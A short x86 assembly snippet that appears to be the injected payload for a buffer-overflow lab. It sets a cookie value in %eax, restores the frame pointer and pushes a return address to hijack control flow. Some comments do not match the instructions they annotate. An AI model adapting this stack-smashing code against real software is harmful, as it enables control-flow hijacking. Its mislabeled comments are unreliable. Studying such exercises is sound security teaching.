/* 0x08048dd5 is the real return address 
   0x556833b0 is the old real base pointer */
movl $0x5659251b,%eax /* write cookie into return */
movl %esp,%edx /* set base pointer to actual one */
addl $0x18,%edx /* push old return address */
movl %esp,%ebp
push $0x08048d2e
ret



